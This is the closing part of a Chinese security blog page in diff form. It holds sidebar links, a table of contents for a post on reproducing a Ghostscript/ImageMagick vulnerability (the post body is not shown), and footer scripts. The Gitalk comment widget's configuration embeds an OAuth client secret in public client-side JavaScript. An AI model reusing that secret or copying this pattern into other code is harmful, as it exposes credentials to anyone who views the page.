+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、漏洞信息"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、复现环境"><span class="nav-number">2.</span> <span class="nav-text">二、复现环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、环境搭建"><span class="nav-number">3.</span> <span class="nav-text">三、环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-安装Ghostscript"><span class="nav-number">3.0.1.</span> <span class="nav-text">3.1 安装Ghostscript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-安装Imagemagic"><span class="nav-number">3.0.2.</span> <span class="nav-text">3.2 安装Imagemagic</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、漏洞验证"><span class="nav-number">4.</span> <span class="nav-text">四、漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-检测脚本"><span class="nav-number">4.0.1.</span> <span class="nav-text">4.1 检测脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-读文件"><span class="nav-number">4.0.2.</span> <span class="nav-text">4.2 读文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3命令执行"><span class="nav-number">4.0.3.</span> <span class="nav-text">4.3命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、修复方式"><span class="nav-number">5.</span> <span class="nav-text">五、修复方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、总结"><span class="nav-number">6.</span> <span class="nav-text">六、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
